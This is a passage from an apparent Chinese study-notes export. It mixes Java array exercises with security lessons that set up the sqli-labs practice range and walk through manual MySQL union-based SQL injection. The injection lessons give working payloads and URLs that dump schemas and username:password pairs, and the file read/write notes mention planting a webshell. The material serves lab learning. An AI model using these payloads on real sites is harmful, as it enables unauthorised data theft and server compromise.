= \" + a[0]);\n        System.out.println(\"最后一个元素 = \" + a[5]);\n\n        // 一维数组怎么遍历呢？\n        for(int i = 0; i \u003c a.length; i++){\n            System.out.println(a[i]); // i是从0到5，是下标\n        }\n\n        // 下标为6表示第7个元素，第7个元素没有，下标越界了。会出现什么异常呢？\n        //System.out.println(a[6]); //ArrayIndexOutOfBoundsException（比较著名的异常。）\n\n        // 从最后一个元素遍历到第1个元素\n        for (int i = a.length - 1; i \u003e= 0; i--) {\n            System.out.println(\"颠倒顺序输出--\u003e\" + a[i]);\n        }\n    }\n}\n\n```\noutput\n![[../../../../assets/Pasted image 20220715190322.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/192_main%E6%96%B9%E6%B3%95%E4%B8%8A%E9%9D%A2%E7%9A%84String_args":{"title":"192_main方法上面的String_args","content":"# 192_main方法上面的String_args\n\u003e[!tip]+ 作用\n\u003e这个数组是留给用户的，用户可以在控制台上输入参数，这个参数自动会被转换为“String[] args”\n## 解释\n JVM调用main方法的时候，会自动传一个String数组过来。\n 这个方法程序员负责写出来，JVM负责调用。JVM调用的时候一定会传一个String数组过来。\n默认长度：0\n! [[../../../../assets/Pasted image 20220715192618.png|400]]\n\n## 输入参数\n输入会变成一个数组，**空格分开各个参数**，不是逗号\n第一种：\n\t1. 打开run的这个  ![[../../../../assets/Pasted image 20220715192913.png|400]]\n\t2. 设置参数 ![[../../../../assets/Pasted image 20220715193053.png|400]]\n\t3. output![[../../../../assets/Pasted image 20220715193123.png|400]]\n第二种：\n\t1. 在cmd窗口，javac编译\n\t2. `javac 文件名 你输入的参数`，也可以带入参数\n\t3. ![[../../../../assets/Pasted image 20220715193821.png|500]]\n\t\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/193_%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%84":{"title":"193_引用数据类型数组","content":"# 193_引用数据类型数组\n\u003e[!info]+ 总结\n\u003e数组中可以将**引用类型**的类型实例作为**元素**\n\u003e元素可以是这个元素的类本身的对象，也**可以是他的继承对象**，即子类型的对象\n\u003e还可以通过遍历的方式去使用其中的方法\n\n```java\npublic class Test03 {  \n    public static void main(String[] args) {  \n//        创建一个Animal类型的数组  \n        Animal[] an={new Animal(),new Cat(),new Dog(),new DogSon()};  \n        for (int i=0;i\u003can.length;i++){  \n            an[i].move();  \n        }  \n    }  \n}  \n  \nclass Animal{  \n    public void move(){  \n        System.out.println(\"动物在移动\");  \n    }  \n}  \nclass Cat extends Animal{  \n    @Override  \n    public void move() {  \n        System.out.println(\"小猫在走猫步\");  \n    }  \n}  \nclass Dog extends Animal{  \n    @Override  \n    public void move() {  \n        System.out.println(\"小狗在打滚\");  \n    }  \n}  \nclass  DogSon extends Dog{  \n    @Override  \n    public void move() {  \n        System.out.println(\"狗儿子在学打滚\");  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220715204628.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/194_%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9":{"title":"194_数组扩容","content":"# 194_数组扩容\n先新建一个大容量的数组，然后将小容量数组中的数据一个一个拷贝到大数组当中。\n\u003e[!tip]+ 注意\n\u003e如果数组的元素是引用，那么数组中存储的其对象的内存地址\n\u003e所以，拷贝的时候实际是拷贝的内存地址\n\n  结论：数组扩容效率较低。因为涉及到拷贝的问题。所以在以后的开发中请注意：尽可能少的进行数组的拷贝。\n  可以在创建数组对象的时候预估计以下多长合适，最好预估准确，这样可以减少数组的扩容次数。提高效率。\n  \u003e[!bug]+ 数组拷贝方法：arrarycopy()\n  \u003earraycopy() 方法位于 java.lang.System 类中\n\n语法格式\n  ```java\nSystem.arraycopy(dataType[] srcArray,int srcIndex,int destArray,int destIndex,int length)\n```\n原数组,原数组中的起始下标,目标数组,目标数组中的起始下标,复制的数组长度。\n# eg\n```java\npublic class Test04 {  \n    public static void main(String[] args) {  \n        int[] a={1,5,6,4,4};  \n        int[] b=new int[10];  \n        System.arraycopy(a,0,b,2,a.length);  \n        for (int i=0;i\u003c b.length;i++){  \n            System.out.println(\"第\"+i+\"个元素：\"+b[i]);  \n        }  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220716102350.png]]\n\n# 其他拷贝方法\n[java拷贝](http://c.biancheng.net/view/924.html)","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/195_%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84":{"title":"195_二维数组","content":"# 195_二维数组\n## 概述\n1. 二维数组其实是一个特殊的一维数组，特殊在这个**数组当中的每一个元素是一个一维数组。**\n2. 三维数组同理，每一个元素都是一个二维数组\n## 初始化\n1. 静态初始化\n```java\nint[][] array = {{1,1,1},{2,3,4,5},{0,0,0,0},{2,3,4,5},{2,3,4,5},{2,3,4,5},{2,3,4,5}};\n```\n2. 动态初始化\n```java\nnt[][] array = new int[3][4];\n```\n\n\u003e[!info]+ 注意\n\u003e静态初始化可以建立一个不规则的二维数组，即每个元素数组中的元素个数可能不相同。\n\u003e比如，第一个元素数组中的个数是5，第二个元素数组中的个数是8；\n\u003e但动态初始化，每行每列的个数都是一样的，即每个元素数组 中的个数都是一样的。\n\u003e**数组一旦建立，其元素个数不变，只能通过[[194.数组扩容|数组扩容]]**的方式来增加容量\n\u003e![[../../../../assets/Pasted image 20220716111850.png]]\n\n### 赋值的方法\n1. 先建一个一维数组b，然后赋给二维数组a[0]\n2. 对二维数组的元素一个一个赋值\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/196_eg1_%E6%A8%A1%E6%8B%9F%E5%8E%8B%E6%A0%88":{"title":"196_eg1_模拟压栈","content":"# 196_eg1_模拟压栈\n```java\n\n/*\n\n    编写程序，使用一维数组，模拟栈数据结构。\n\n    要求：\n\n        1、这个栈可以存储java中的任何引用类型的数据。\n\n        2、在栈中提供push方法模拟压栈。（栈满了，要有提示信息。）\n\n        3、在栈中提供pop方法模拟弹栈。（栈空了，也有有提示信息。）\n\n        4、编写测试程序，new栈对象，调用push pop方法来模拟压栈弹栈的动作。\n\n        5、假设栈的默认初始化容量是10.（请注意无参数构造方法的编写方式。）\n\n */\n\npublic class MyStackTest {\n\n    public static void main(String[] args) {\n\n  \n\n        // 创建一个栈对象，初始化容量是10个。\n\n        MyStack stack = new MyStack();\n\n  \n\n        // 调用方法压栈\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object());\n\n        stack.push(new Object()); // 最后压入的。最先弹出来。（这个才符合栈的数据结构。）\n\n  \n\n        // 压这个元素失败了。\n\n        stack.push(new Object());\n\n  \n\n        // 弹栈\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n        stack.pop();\n\n  \n\n        stack.pop();\n\n    }\n\n}\n```\n\n```\nclass MyStack {\n\n    // 向栈当中存储元素，我们这里使用一维数组模拟。存到栈中，就表示存储到数组中。\n\n    // 因为数组是我们学习java的第一个容器。\n\n    // 为什么选择Object类型数组？因为这个栈可以存储java中的任何引用类型的数据\n\n    // new Animal()对象可以放进去，new Person()对象也可以放进去。因为Animal和Person的超级父类就是Object。\n\n    // 包括String也可以存储进去。因为String父类也是Object。\n\n    private Object[] elements;\n\n  \n\n    // 栈帧，永远指向栈顶部元素\n\n    // 那么这个默认初始值应该是多少。注意：最初的栈是空的，一个元素都没有。\n\n    //private int index = 0; // 如果index采用0，表示栈帧指向了顶部元素的上方。\n\n    //private int index = -1; // 如果index采用-1，表示栈帧指向了顶部元素。\n\n    private int index;\n\n  \n\n    /**\n\n     * 无参数构造方法。默认初始化栈容量10.\n\n     */\n\n    public MyStack() {\n\n        // 一维数组动态初始化\n\n        // 默认初始化容量是10.\n\n        this.elements = new Object[10];\n\n        // 给index初始化\n\n        this.index = -1;\n\n    }\n\n  \n\n    /**\n\n     * 压栈的方法\n\n     * @param obj 被压入的元素\n\n     */\n\n    public void push(Object obj){\n\n        if(index \u003e= elements.length - 1){\n\n            System.out.println(\"压栈失败，栈已满！\");\n\n            return;\n\n        }\n\n        // 程序能够走到这里，说明栈没满\n\n        // 向栈中加1个元素，栈帧向上移动一个位置。\n\n        index++;\n\n        elements[index] = obj;\n\n        // 在声明一次：所有的System.out.println()方法执行时，如果输出引用的话，自动调用引用的toString()方法。\n\n        System.out.println(\"压栈\" + obj + \"元素成功，栈帧指向\" + index);\n\n    }\n\n  \n\n    /**\n\n     * 弹栈的方法，从数组中往外取元素。每取出一个元素，栈帧向下移动一位。\n\n     * @return\n\n     */\n\n    public void pop(){\n\n        if(index \u003c 0){\n\n            System.out.println(\"弹栈失败，栈已空！\");\n\n            return;\n\n        }\n\n        // 程序能够执行到此处说明栈没有空。\n\n        System.out.print(\"弹栈\" + elements[index] + \"元素成功，\");\n\n        // 栈帧向下移动一位。\n\n        index--;\n\n        System.out.println(\"栈帧指向\" + index);\n\n    }\n\n  \n\n    // set和get也许用不上，但是你必须写上，这是规矩。你使用IDEA生成就行了。\n\n    // 封装：第一步：属性私有化，第二步：对外提供set和get方法。\n\n    public Object[] getElements() {\n\n        return elements;\n\n    }\n\n  \n\n    public void setElements(Object[] elements) {\n\n        this.elements = elements;\n\n    }\n\n  \n\n    public int getIndex() {\n\n        return index;\n\n    }\n\n  \n\n    public void setIndex(int index) {\n\n        this.index = index;\n\n    }\n\n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220716200322.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/197_eg2_%E9%85%92%E5%BA%97":{"title":"197_eg2_酒店","content":"# 197_eg2_酒店\n# 思路\n\u003e[!tip]+ 怎么个思路\n\u003e1. 搭建一个酒店，需要考虑其基本的组成\n\u003e2. 一个酒店的基本单位是房间，所以需要一个room类，房间有三个状态。\n\u003e\t1. 房间号，由层数和房间号组成\n\u003e\t2. 空闲与否，boolean\n\u003e\t3. 房间类型：单人间、标准间、豪华间\n\u003e4. 房间需要考虑是否是一个房间，以及如何进行输出。所以需要考虑重写`equals`和`toString`方法\n\u003e5. hotel类由许多的房间组成，所以hotel的属性就是room类型的二维数组 \n\u003e6. 需要的方法\n\u003e\t1. 打印房间情况的方法\n\u003e\t2. 订房的方法\n\u003e\t3. 退房的方法\n\u003e7. 一个主类对方法进行测试\n\u003e\t1. 建酒店，new 一个hotel\n\u003e\t2. if判断用户需求\n\n# 代码\n```java\n\npublic class Room {  \n    //test  \n/*    public static void main(String[] args) {  \n        Room r=new Room(12,\"单人间\",true);  \n        System.out.println(r);    }*/    private int no;  \n    private String type;  \n    private boolean status;  \n  \n    //封装  \n    public Room() {  \n        this.status=true;//默认空闲  \n    }  \n  \n    public Room(int no, String type, boolean status) {  \n        this.no = no;  \n        this.type = type;  \n        this.status = status;  \n    }  \n  \n    public int getNo() {  \n        return no;  \n    }  \n  \n    public void setNo(int no) {  \n        this.no = no;  \n    }  \n  \n    public String getType() {  \n        return type;  \n    }  \n  \n    public void setType(String type) {  \n        this.type = type;  \n    }  \n  \n    public boolean isStatus() {  \n        return status;  \n    }  \n  \n    public void setStatus(boolean status) {  \n        this.status = status;  \n  \n    }  \n//    重写equals方法  \n  \n    @Override  \n    public boolean equals(Object obj) {  \n        if (obj==null||!(obj instanceof Room)) return false;  \n        if (obj==obj) return true;  \n        Room r=(Room)obj;  \n        return this.no==r.no;  \n    }  \n//    重写toString方法  \n  \n    @Override  \n    public String toString() {  \n        return \"[\"+no+\" \"+type+\" \"+(status==true?\"空闲\":\"占用\")+\"]\";  \n    }  \n}\n```\n\n```java  \npublic class Hotel {  \n    private Room[][] rooms;  \n  \n    //对一个酒店进行基本的构造  \n    public Hotel() {  \n        rooms = new Room[3][10];  \n        for (int i = 0; i \u003c rooms.length; i++) {  \n            for (int j = 0; j \u003c rooms[i].length; j++) {  \n                if (i == 0) {  \n                    rooms[i][j] = new Room((i + 1) * 100 + j + 1, \"单人间\", true);  \n                } else if (i == 1) {  \n                    rooms[i][j] = new Room((i + 1) * 100 + j + 1, \"标准间\", true);  \n                } else {  \n                    rooms[i][j] = new Room((i + 1) * 100 + j + 1, \"豪华间\", true);  \n                }  \n            }  \n        }  \n    }  \n  \n    public Hotel(Room[][] rooms) {  \n        this.rooms = rooms;  \n    }  \n//    //重写toString方法，将所有的房间返回  \n    @Override  \n    public String toString() {  \n        String s=\"\";  \n        for (int i = 0; i \u003c rooms.length; i++) {  \n            for (int j = 0; j \u003c rooms[i].length; j++) {  \n                s+=rooms[i][j]+\" \";  \n            }  \n                s+=\"\\n\";  \n        }  \n        return s;  \n    }  \n//    打印空闲的房间  \n    public void dayin(){  \n        for (int i = 0; i \u003c rooms.length; i++) {  \n            for (int j = 0; j \u003c rooms[i].length; j++) {  \n                if (rooms[i][j].isStatus()==true){  \n                    System.out.println(rooms[i][j]);  \n                }  \n            }  \n            System.out.println();  \n        }  \n    }  \n  \n//    订房  \n    public void order(int roomNo){  \n        Room room=rooms[roomNo/100-1][roomNo%100-1];//获取房间对象的数组下标  \n        if (room.isStatus()==true){  \n            room.setStatus(false);  \n            System.out.println(room.getNo()+\"订房成功\");  \n        }else  \n            System.out.println(room.getNo()+\"已被其他人订房\");  \n    }  \n    //退房  \n    public void exit(int roomNo){  \n        Room room=rooms[roomNo/100-1][roomNo%100-1];//获取房间对象的数组下标  \n        if (room.isStatus()==false){  \n            room.setStatus(true);  \n            System.out.println(room.getNo()+\"退房成功\");  \n        }else  \n            System.out.println(room.getNo()+\"未被订房，退房失败\");  \n    }  \n  \n  \n}\n```\n\n```java\npublic class HotelManagerSystem {  \n    public static void main(String[] args) {  \n        Hotel h=new Hotel();  \n        System.out.println(\"请输入数字选择功能选项：\");  \n  \n        java.util.Scanner s=new java.util.Scanner(System.in);  \n  \n        while (true){  \n            System.out.println(\"[0]退出系统 [1]查看房间情况 [2]订房 [3]退房 [4]空房查询\" );  \n            int i=s.nextInt();  \n            if (i==0){  \n                System.out.println(\"欢迎下次光临，正在退出系统 ~\");  \n                break;  \n            } else if (i==1) {  \n                System.out.println(\"正在为你获取房间情况：\");  \n                System.out.println(h);  \n            } else if (i==2) {  \n                System.out.println(\"输入您要订阅的房间号码：\");  \n                i=s.nextInt();  \n                h.order(i);  \n            }else if (i==3) {  \n                System.out.println(\"输入您要退订的房间号码：\");  \n                i=s.nextInt();  \n                h.exit(i);  \n            }else if (i==4) {  \n                //剩余空房  \n                System.out.println(\"====剩余空房：\");  \n                h.dayin();  \n            }  \n        }  \n        s.close();  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220718215324.png]]\n![[../../../../assets/Pasted image 20220718215331.png]]\n## 总结\n\u003e[!bug]+ 总结\n\u003e如果直接做题的话，我发现思路非常不好，尤其是对于程序的逻辑方面，不知道自己需要做什么，老是忘记自己要写什么方法，需要怎么去覆盖tostring以及equals等等\n\u003e但是如果事先将思路整理写下来，然后再进行工作的话，我发现这个速度一下就蹭蹭上去了","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/2.1.SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA":{"title":"2.1.SQL注入之sqli-labs环境搭建","content":"\n\n\n- # SQL注入之sqli-labs环境搭建\n  \n  往往很多新手在刚学习SQL注入的时候，都需要拥有一个能SQL注入的网站，需要有**SQL注入点** 的。直接去互联网上找的话对新手未免有点太难了，因此：我们一般都是在本地搭建一个能SQL注入测试的网站，那样我们学习SQL注入就容易多了。\n  \n  Sqli-labs是一个印度程序员写的，用来学习[sql注入](https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5\u0026spm=1001.2101.3001.7020)的一个游戏教程。\n  \n  Sqli-labs项目地址—Github获取：[https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)（在预习资料中有下载好的）\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f0e4cdc9139a41fca432bb51ed8e4d3d.png){:height 336, :width 734}\n## Sqli-labs环境安装\n###### 需要安装以下环境\n\napache+mysql+php\n如果可以的话，推荐在windows和linux下分别安装\n- ### 工具下载链接：\n  \n  链接：https://pan.baidu.com/s/19om5w_QIK8uGWjhe2_SnXA\n  提取码：ianb\n  \n  **安装之前确保本地没有下载mysql服务器！**\n  \n  下载地址：https://www.xp.cn/\n  \n  在发放的预习资料里面有下载好的工具：\n  \n  解压之后如下图，运行phpstudy_x64.exe:\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/776589a200c541c7ba73896dcc674f95.png)\n  \n  双击第一个运行程序后，出现安装界面，点击下方的“自定义安装”安装在除C盘外的盘符。之后点击立即安装即可。（一定要记住自己的安装目录 ！！！！！！）\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f24dfc2541824962a042c5e499e99202.png)\n  \n  点击安装之后，会出现安装进度条。等待不到1分钟，就会出现安装完成界面。点击安装完成，进入首页。\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/9435aede1cbe44c1a9025247ee4a1be1.png)\n  \n  安装完成启动对应服务：\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/2b7320469dcd490397a8b8c80f87a5d5.png)\n  \n  **需要注意的是：phpstudy自带的php版本过高，不兼容sqli-las靶场中php的版本，需要手动设置为低版本**\n  \n  点击 软件管理 --\u003e php --\u003e 选择php5.2.17 点击安装 即可\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/ce6504666e5540b1b50f7caa432a0341.png)\n  \n  检查是否更换好：\n  \n  点击 网站  --\u003e 管理 --\u003e php版本 --\u003e\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/53c08b3e6036439e82ae50e8e801355f.png)\n  \n  sqli-las下载解压完成后，把解压文件放入phpstudy安装路径下的www文件夹中\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/97f47440dafa4744a07e44ba4e3eda90.png)\n  \n  sqli-labs 正常访问需要连接数据库，设置连接数据库配置文件才能正常连接。\n  \n  mysql配置文件在sqli-labs文件中sql-connections\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/a0cf0cd341aa4e10900bdf15a5d2aeef.png){:height 573, :width 754}\n  \n  进入sql-connections找到db-creds文件进行配置，phpstudy中默认账号和密码为 root\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/b124f42f95f247238d8fbfbaf20a3a07.png)\n  \n  **注意：要想phpstudy中自带mysql正常使用，需确保本地没有下载mysql服务器，如有需要卸载本地mysql服务，防止端口占用！**\n# phpstudy连接mysql总是启动了又停止\n\n第一种情况可能是端口占用问题，可以选择在phpstudy的MySQL中点击 ‘配置’ 里面更改端口，改成3307即可，不过一般这种情况较少\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/6f223955c9c8430a8324b7681117079d.png)\n\n第二种情况就是曾经在电脑上安装过mysql，忘记了的可以在服务里面进行查看，比如：\n\n如何查看 我的电脑--》右击--》管理--》服务和应用程序--》服务\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/8756981d09ad41a68681b10cef633ce0.png)\n\n这时候可以进入win + R输入cmd，最好以管理员的身份进入\n之后输入 sc delete mysql，做完这一步在进入注册表，彻底删除之前的mysql\n\n1、HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Eventlog\\Application\\MySQL 目录删除\n\n2、 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Services\\Eventlog\\Application\\MySQL 目录删除\n\n3、HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Application\\MySQL 目录删除\n\n做完这几步后恭喜你，离成功很近了，再次进入[phpstudy](https://so.csdn.net/so/search?q=phpstudy\u0026spm=1001.2101.3001.7020)，在软件管理中删除之前的mysql服务，重新安装自己合适的选项，之后再去首页启动mysql服务就成功啦！\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/fc1e111299b743eb88f56dcf570e8b38.png)","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/2.2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5":{"title":"2.2 SQL注入之MYSQL手工注入","content":"\npublic:: true\n\n# SQL注入之MYSQL手工注入\n\n本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。\n- ### sqli-labs数字型注入\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/a6c51cb8e8ec4a3b8840fa3c8e105f86.png){:height 247, :width 734}\n  \n  在url中输入id值，执行查询sql语句。即可得到对应数据\n  \n  less-2源码分析：\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/d4245f8d3a7b423ebb96ddaa5f894fa8.png)\n  \n  浏览器 进行数据提交  服务器  ：\n  \n  ```\n  get 提交  ：  url   数据长度 \n     速度快  \n  用于： \n  \n  post 提交 ： 服务器    安全性   数据量 \n  ```\n### 注入流程\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/708c5f66672d462d8bffd38e68791f2f.png)\n### 注入语句\n\n```sql\n尝试手工注入：\nSQL注入： \n1.判断有无注入点   and 1 = 1； true \n随便输入内容  ==  报错  注入\n            ==  没有注入\n2.猜解列名数量 order by %20 空格\n字段 4个\n\n3.报错，判断回显点 union \n4.信息收集 \n数据库版本 version()\n高版本：5.0  \n\t系统库： infromation 。。。\n数据库名称：database（）\n低版本：5.0 \n5.使用对应SQL进行注入  \n\t数据库库名：security\n. 下一级  \ninfromation_schema.tables 查找表名\ntable_name\n查询serurity库下面 所有的表名 \n\ndatabase（）\n\n\n= 前后 连到一起\nunion select 1,group_concat(table_name),3 from information_schema.tables\nwhere table_schema=database()\n\n表： users\n如何查询表里面有那些字段？ \nuser 字符 转行 16进制\nunion select 1,group_concat(column_name),3 from information_schema.columns\nwhere table_name=0x7573657273\n\nusername  password  字段数据  \nselect username,password from users\n0x3a  :\nunion select 1,2,(select group_concat(username,0x3a,password)from users)\n\n```","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/2.3-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8A":{"title":"2.3 SQL注入之高权限注入上","content":"\n\n# SQL注入之高权限注入\n\n在数据库中区分有数据库系统用户与数据库普通用户,二者的划分主要体现在对一些高级函数与资源表的访问权限上。直白一些就是高权限系统用户拥有整个数据库的操作权限,而普通用户只拥有部分已配置的权限。\n\n网站在创建的时候会调用数据库链接,会区分系统用户链接与普通用户链接;当多个网站存在一个数据库的时候,root就拥有最高权限可以对多个网站进行管辖,普通用户仅拥有当前网站和配置的部分权限。所以当我们获取到普通用户权限时,我们只拥有单个数据库权限,甚至文件读写失败;取得高权限用户权限，不仅可以查看所有数据库,还可以对服务器文件进行读写操作。\n### 多个网站共享mysql服务器\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/d7033b4a97df430fa52b609e39dff24e.png)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/2e40fafad1f84f6f92cc48a4702e3296.png)\n### MySQL 权限介绍\n\nmysql中存在4个控制权限的表，分别为user表，db表，tables_priv表，columns_priv表，\n我当前的版本mysql 5.7.22 。\n\n```\nselect * from user where user='root' and host='localhost'\\G;\n\n\tmysql权限表的验证过程为：\n\n\t先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。\n\n\t通过身份认证后，进行权限分配，\n\t按照user，db，tables_priv，columns_priv的顺序进行验证。\n\t即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，\n\t将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，\n\t并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。\n\n 2.1 系统权限表\n\tUser表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限 \n\tDb表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库 \n\tTables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表 \n\tColumns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段 \n\tProcs_priv表：存放存储过程和函数级别的权限\n\n\n 2. MySQL 权限级别分为： \n\t全局性的管理权限： 作用于整个MySQL实例级别 \n\t数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上 \n\t数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象\n\n 3.查看mysql 有哪些用户：\n\tmysql\u003e select user,host from mysql.user;\n\n 4.查看用户对应权限\n select * from user where user='root' and host='localhost'\\G;  #所有权限都是Y ，就是什么权限都有\n\n 5.创建 mysql 用户\n\t有两种方式创建MySQL授权用户\n\n\t执行create user/grant命令（推荐方式）\n\tCREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';\n\t通过insert语句直接操作MySQL系统权限表\n\n 6.只提供id查询权限\n grant select(id) on test.temp to test1@'localhost' identified by '123456';\n\n 7.把普通用户变成管理员\n\tGRANT ALL PRIVILEGES ON *.* TO 'test1'@'localhost' WITH GRANT OPTION;\n\n 8.删除用户\n\tdrop user finley@'localhost';\n```","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/2.4-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8B":{"title":"2.4 SQL注入之高权限注入下","content":"\n\n# SQL注入之高权限注入\n\n1.注入流程与上节实例相同\n#### 查询所有数据库名称\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/fdc981b9a55d426f8ac014bb61d6356f.png)\n\n```\nhttp://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata\n```\n#### 查询数据库对应的表名\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/5fd74715c4a24cb8bcebec4a7778a0f1.png)\n\n```\nhttp://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x74657374\n```\n#### 查询表名对应的字段名\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/8cbb187549814a32afc2cb0a82b7765b.png)\n\n```\nhttp://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7431\n```\n#### 查询数据\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/1b9dc7926a544a1197a7f93a5be493d8.png)\n\n```\nhttp://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,name,pass%20from%20test.t1\n```","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/2.5-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99":{"title":"2.5 SQL注入之文件读写","content":"\n\n# SQL注入之文件读写\n#### 文件读写注入的原理\n\n就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。\n#### 文件读写注入的条件\n\n高版本的MYSQL添加了一个新的特性`secure_file_priv`，该选项限制了mysql导出文件的权限\n\n**secure_file_priv选项**\n\n```\nlinux\ncat  etc/conf\n\nwin\nwww/mysql / my.ini\n\n```\n\nshow global variables like '%secure%'  查看mysql全局变量的配置\n\n1、读写文件需要 `secure_file_priv`权限\n\n**`secure_file_priv=`**\n\n代表对文件读写没有限制\n\n`secure_file_priv=NULL`\n\n代表不能进行文件读写\n\n`secure_file_priv=d:/phpstudy/mysql/data`\n\n代表只能对该路径下文件进行读写\n\n2、知道网站绝对路径\n\nWindows常见：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/52b8185c15804b098e5832e56952f9d5.png)\n\nLinux常见：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/c22c368cda784e5ebb911ff0bbd0fa99.png)\n\n路径获取常见方式：\n\n报错显示，遗留文件，漏洞报错，平台配置文件等\n#### 